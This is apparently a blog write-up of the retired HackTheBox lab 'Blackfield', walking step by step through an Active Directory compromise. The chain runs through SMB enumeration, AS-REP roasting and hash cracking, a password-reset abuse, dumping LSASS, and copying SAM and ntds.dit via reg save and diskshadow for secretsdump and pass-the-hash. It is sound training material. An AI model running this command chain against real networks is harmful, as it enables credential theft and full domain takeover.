Introduction:

Welcome to my writeup of the retired HackTheBox machine called Blackfield! For those keeping up with my posts, you’ll know that this is my fifth Active Directory lab that I have done. It’s also the first hard difficulty machine that I completed! Personally, this is a huge milestone and definitely a big hurdle based on everything that I heard about these machines and especially now that I have experience with one of them. This lab contained multiple steps from enumerating public smb shares to find users that are AS-REP roastable to laterally moving and using SeBackupPrivilege to escalate privileges to Administrator.

Gaining a Foothold:

The first thing that I did was an nmap scan.

nmap -Pn -p- -v -sCV <IP> -oN scantcp.txt

I started off with a TCP and version scan. As I build my methodology and become more thorough, I do two seperate scans where I do one for TCP connections and another for UDP scanning.

sudo nmap -Pn -p- -v -sU <IP> -oN scanudp.txt

Now that I have done both of the scans, I’ll look at the results for both from the output files and see what I find.

I get the usual results as I have in the past few AD labs that I have done. More than likely, I’ll be able to anonymously use ldap or smb to gain more information about the domain.

The UDP scan didn’t reveal much else, just that ldap is open like the TCP scan already told me. Also, that dns is open.

smbmap -H <IP> -u 'guest' -p ''

I decide to use smbmap first and see if there is any public shares that I can look through to get more information. I do see that I have read only access to the profiles$ share. It sounds like to me that I can get some usernames from that.

smbmap -H <IP> -u 'guest' -p '' -r profiles$

Accessing the share returns an exhaustive list of users, about 300+ of them to be exact. With this list though, I can see what accounts are vulnerable to the many attacks that I have at my disposal. I’ll try one of my favorites, AS-REP roasting.

smbmap -H <IP> -u 'guest' -r 'profiles$' | grep "dr--r--r--" | awk '{print $8}' > users.txt

I’ll use this command to quickly add all of the users to a txt file and start enumerating.

GetNPUsers.py blackfield.local/ -usersfile users.txt -dc-ip <IP> -no-pass -format hashcat -outputfile hashes.txt

I’ll use the Impacket Suite to obtain any possible hashes I can and then I’ll use hashcat to crack them offline. For reference, AS-REP roasting is finding users that do have Kerberos pre auth disabled. This means that you do not need the password to obtain the hash, just the username.

I was only able to get one hash returned to me. This one was for the support user. I’ll use hashcat to crack it now.

hashcat -m 18200 hashes.txt /usr/share/wordlist/rockyou.txt

Using the famous rockyou.txt wordlist, I was able to get the password for the user.

It gave me the password which is #00^BlackKnight. I tried to do some more digging with these credentials, but it didn’t seem that I was able to find anything that I didn’t already find. For now, I’ll use Bloodhound to view the domain graphically and see potential attack vectors.

Lateral Movement:

bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -c All -ns <IP> --zip

Since I can’t get an active session over evil-winrm or any other tool to get a shell session. I’ll use bloodhound-python from my host machine and put all of the information about the domain in a zip file to upload.

Launching up Bloodhound and going through the usual queries to see the shortest path to high value targets, I couldn’t find much. I’ll mark the support user as owned and see if they have any special privileges over any of the other users in the domain.

I went through some of the usernames that sounded like they would have something important within them. I ended up finding that I have the ForceChangePassword attribute over the audit2020 user. I’ll change the password of the user and see if they can read any of the other smb shares that I have been unable to read.

rpcclient -U 'BLACKFIELD/support#00^BlackKnight' -c "setuserinfo2 audit2020 23 NewPassword123" <IP>
smbmap -H <IP> -u 'audit2020' -p 'NewPassword123'

After changing the password and using smbmap again, I am now able to read more shares. I particularly am interested in the forensic share that I am now able to read.

smbmap -H <IP> -u 'audit2020' -p 'NewPassword123' -r forensic

There are three directories that all seem very intriguing. To get a more interactive session to make it easier to navigate through the directories, I’ll switch over to smbclient.

smbclient //<IP>/forensic -U 'blackfield.local/audit2020'
ls
cd commands_output
ls

cd ..
cd memory_analysis
ls

I want to look through the directories first before I jump on the first thing that seems interesting. The memory_analysis folder immediately stood out to me as soon as I saw the lsass.zip file. LSASS (Local Security Authority Subsystem Service) is a Windows process responsible for managing credentials and enforcing security policies. The best part about it is that it stores NTLM hashes and Kerberos tickets in its memory.

get lsass.zip

I’ll download the zip file to my host machine so that I can get the contents inside of it and hopefully find more credentials for higher value users.

unzip lsass.zip

I’ll unzip the file and then use pypykatz to dump the contents of it.

pypykatz lsa minidump lsass.DMP

Dumping the contents, I get the hash for the svc_backup user. You’ll notice that there is no password and it is just the hash. This means that I will do a pass-the-hash attack to gain a shell session as the user.

evil-winrm -i <IP> -u 'svc_backup' -H '<HASH>'
cd ..
cd Desktop
ls

I was finally able to get the user flag! This is definitely the most steps that I’ve done to get to this point in a lab. The job isn’t over yet though. I still have to get the root flag.

Privilege Escalation:

The first thing to always do when you start trying to find how to escalate your privileges; is seeing what permissions you have as the current user you are authenticated as.

whoami /priv

I immediately notice that I have SeBackupPrivilege enabled. Any user with this privilege can bypass ACLs and NTFS permissions to copy and backup any file. This means that I can copy SAM and SYSTEM and download them from my evil-winrm session to my host machine. I can then dump the secrets and hopefully get Administrator credentials to get the root flag.

mkdir C:\temp
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
download C:\temp\SAM
download C:\temp\SYSTEM

Since the privilege is already enabled, I have less steps to do. I’ll go ahead and save SAM and SYSTEM to a temp folder and download them to my host machine.

secretsdump.py -sam SAM -system SYSTEM LOCAL

Now this is where I realized something. SAM most likely has old hashes and I figured that out when using the hash it gave me for the Administrator returned an authorization error. What I really needed was ntds.dit to get the current Administrator hash. I knew it shouldn’t have been that easy. When it comes to copying NTDS, there are a few extra steps. I’ll have to use disk shadow if I want to be able to copy it.

cat diskshadow.txt

set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% Z:

I’ll make this file to create my shadow Z drive on my svc_backup session so that I can copy NTDS to it.

unix2dos diskshadow.txt

I’ll also convert it to DOS format so that it can properly execute on the Windows environment.

upload diskshadow.txt C:\temp\diskshadow.txt

I upload the file to my session.

diskshadow /s C:\temp\diskshadow.txt

I’ll execute the file with diskshadow to create my shadow Z drive. Now I should be able to copy NTDS to my temp folder.

robocopy /b Z:\Windows\NTDS C:\temp\backup ntds.dit

I successfully copied the file! All that is left to do now is dump the contents and get the correct Administrator hash.

download C:\temp\backup

I was able to download the backup with no issues.

secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

I got a different hash for the Administrator! This should hopefully be all I need and now I can get that root flag.

evil-winrm -i <IP> -u 'Administrator' -H '<HASH>'
cd ..
cd Desktop
ls

I passed the hash and finally got that root flag! This has probably been the most that I’ve done in a HTB lab besides RedCross which I did a while back. I certainly had so much fun with this one!
